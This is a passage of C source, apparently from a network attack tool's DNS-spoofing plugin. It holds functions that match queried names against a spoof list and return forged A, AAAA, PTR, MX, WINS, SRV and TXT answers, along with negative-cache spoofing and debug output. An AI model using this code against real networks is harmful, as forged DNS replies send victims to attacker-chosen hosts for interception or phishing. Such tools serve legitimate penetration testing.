      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&authority_list, rr, next);
      *dns_len += len;
      *n_auth += 1;
      
      USER_MSG("dns_spoof: negative cache spoofed for [%s] type %s, TTL [%u s]\n", name, type_str(type), ttl);
   } /* SOA */

exit:

   return E_SUCCESS;
}


/*
 * return the ip address for the name - IPv4
 */
static int get_spoofed_a(const char *a, struct ip_addr **ip, u_int32 *ttl)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_a && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         *ttl = d->ttl;
         
         return E_SUCCESS;
      }
   }
   
   return -E_NOTFOUND;
}

/*
 * return the ip address for the name - IPv6
 */
static int get_spoofed_aaaa(const char *a, struct ip_addr **ip, u_int32 *ttl)
{
    struct dns_spoof_entry *d;
    
    SLIST_FOREACH(d, &dns_spoof_head, next) {
        if (d->type == ns_t_aaaa && match_pattern(a, d->name)) {
            /* return the pointer to the struct */
            *ip = &d->ip;
            *ttl = d->ttl;

            return E_SUCCESS;
        }
    }

    return -E_NOTFOUND;
}

/*
 * return the TXT string for the name
 */
static int get_spoofed_txt(const char *name, char **txt, u_int32 *ttl)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_txt && match_pattern(name, d->name)) {
         /* return the pointer to the string */
         *txt = d->text;
         *ttl = d->ttl;

         return E_SUCCESS;
      }
   }

   return -E_NOTFOUND;
}

/* 
 * return the name for the ip address 
 */
static int get_spoofed_ptr(const char *arpa, char **a, u_int32 *ttl)
{
   struct dns_spoof_entry *d;
   struct ip_addr ptr;
   unsigned int oct[32];
   int len, v4len, v6len;
   u_char ipv4[4];
   u_char ipv6[16];
   char v4tld[] = "in-addr.arpa";
   char v6tld[] = "ip6.arpa";

   len = strlen(arpa);
   v4len = strlen(v4tld);
   v6len = strlen(v6tld);

   /* Check the top level domain of the PTR query - IPv4 */
   if (strncmp(arpa + len - v4len, v4tld, v4len) == 0) {

       /* parses the arpa format */
       if (sscanf(arpa, "%d.%d.%d.%d.in-addr.arpa", 
                   &oct[3], &oct[2], &oct[1], &oct[0]) != 4)
          return -E_INVALID;

       /* collect octets */
       ipv4[0] = oct[0] & 0xff;
       ipv4[1] = oct[1] & 0xff;
       ipv4[2] = oct[2] & 0xff;
       ipv4[3] = oct[3] & 0xff;


       /* init the ip_addr structure */
       ip_addr_init(&ptr, AF_INET, ipv4);

   }
   /* check the top level domain of the PTR query - IPv6 */
   else if (strncmp(arpa + len - v6len, v6tld, v6len) == 0) {
       /* parses the ip6.arpa format for IPv6 reverse pointer */
       if (sscanf(arpa, "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.ip6.arpa", 
                        &oct[31], &oct[30], &oct[29], &oct[28],
                        &oct[27], &oct[26], &oct[25], &oct[24],
                        &oct[23], &oct[22], &oct[21], &oct[20],
                        &oct[19], &oct[18], &oct[17], &oct[16],
                        &oct[15], &oct[14], &oct[13], &oct[12],
                        &oct[11], &oct[10], &oct[9],  &oct[8],
                        &oct[7],  &oct[6],  &oct[5],  &oct[4],
                        &oct[3],  &oct[2],  &oct[1],  &oct[0]) != 32) {
          return -E_INVALID;
       }

       /* collect octets */
       ipv6[0] = (oct[0] << 4) | oct[1];
       ipv6[1] = (oct[2] << 4) | oct[3];
       ipv6[2] = (oct[4] << 4) | oct[5];
       ipv6[3] = (oct[6] << 4) | oct[7];
       ipv6[4] = (oct[8] << 4) | oct[9];
       ipv6[5] = (oct[10] << 4) | oct[11];
       ipv6[6] = (oct[12] << 4) | oct[13];
       ipv6[7] = (oct[14] << 4) | oct[15];
       ipv6[8] = (oct[16] << 4) | oct[17];
       ipv6[9] = (oct[18] << 4) | oct[19];
       ipv6[10] = (oct[20] << 4) | oct[21];
       ipv6[11] = (oct[22] << 4) | oct[23];
       ipv6[12] = (oct[24] << 4) | oct[25];
       ipv6[13] = (oct[26] << 4) | oct[27];
       ipv6[14] = (oct[28] << 4) | oct[29];
       ipv6[15] = (oct[30] << 4) | oct[31];

       /* init the ip_addr structure */
       ip_addr_init(&ptr, AF_INET6, ipv6);

   }
           

   /* search in the list */
   SLIST_FOREACH(d, &dns_spoof_head, next) {
      /* 
       * we cannot return whildcards in the reply, 
       * so skip the entry if the name contains a '*'
       */
      if (d->type == ns_t_ptr && !ip_addr_cmp(&ptr, &d->ip)) {

         /* return the pointer to the name */
         *a = d->name;
         *ttl = d->ttl;
         
         return E_SUCCESS;
      }
   }
   
   return -E_NOTFOUND;
}

/*
 * return the ip address for the name (MX records)
 */
static int get_spoofed_mx(const char *a, struct ip_addr **ip, u_int32 *ttl)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_mx && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         *ttl = d->ttl;
         
         return E_SUCCESS;
      }
   }
   
   return -E_NOTFOUND;
}

/*
 * return the ip address for the name (NetBIOS WINS records)
 */
static int get_spoofed_wins(const char *a, struct ip_addr **ip, u_int32 *ttl)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_wins && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         *ttl = d->ttl;
         return E_SUCCESS;
      }
   }

   return -E_NOTFOUND;
}

/*
 * return the target for the SRV request
 */
static int get_spoofed_srv(const char *name, struct ip_addr **ip, u_int16 *port, u_int32 *ttl)
{
    struct dns_spoof_entry *d;

    SLIST_FOREACH(d, &dns_spoof_head, next) {
        if (d->type == ns_t_srv && match_pattern(name, d->name)) {
           /* return the pointer to the struct */
           *ip = &d->ip;
           *port = d->port;
           *ttl = d->ttl;

           return E_SUCCESS;
        }
    }

    return -E_NOTFOUND;
}

char *type_str (int type)
{
   return (type == ns_t_a    ? "A" :
           type == ns_t_aaaa ? "AAAA" :
           type == ns_t_ptr  ? "PTR" :
           type == ns_t_mx   ? "MX" :
           type == ns_t_wins ? "WINS" : 
           type == ns_t_srv ? "SRV" : 
           type == ns_t_any ? "ANY" : 
           type == ns_t_txt ? "TXT" : "??");
}

static void dns_spoof_dump(void)
{
   struct dns_spoof_entry *d;
   char tmp[MAX_ASCII_ADDR_LEN];

   /* Unused variable */
   (void) tmp;

   DEBUG_MSG("dns_spoof entries:");
   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_txt) {
         DEBUG_MSG("  %s -> \"%s\", type %s, TTL %u", d->name, d->text, type_str(d->type), d->ttl);
      }
      else if (ntohs(d->ip.addr_type) == AF_INET)
      {
         if (d->type == ns_t_srv) {
            DEBUG_MSG("  %s -> [%s:%d], type %s, TTL %u, family IPv4",
                      d->name, ip_addr_ntoa(&d->ip, tmp), d->port, type_str(d->type), d->ttl);
         } 
         else {
            DEBUG_MSG("  %s -> [%s], type %s, TTL %u, family IPv4",
                      d->name, ip_addr_ntoa(&d->ip, tmp), type_str(d->type), d->ttl);
         }
      }
      else if (ntohs(d->ip.addr_type) == AF_INET6)
      {
         if (d->type == ns_t_srv) {
            DEBUG_MSG("  %s -> [%s:%d], type %s, TTL %u, family IPv6",
                      d->name, ip_addr_ntoa(&d->ip, tmp), d->port, type_str(d->type), d->ttl);
         }
         else {
            DEBUG_MSG("  %s -> [%s], type %s, TTL %u, family IPv6",
                      d->name, ip_addr_ntoa(&d->ip, tmp), type_str(d->type), d->ttl);
         }
      }
      else
      {
         DEBUG_MSG("  %s -> ??", d->name);   
      }
   }
}
   
/* EOF */

// vim:ts=3:expandtab

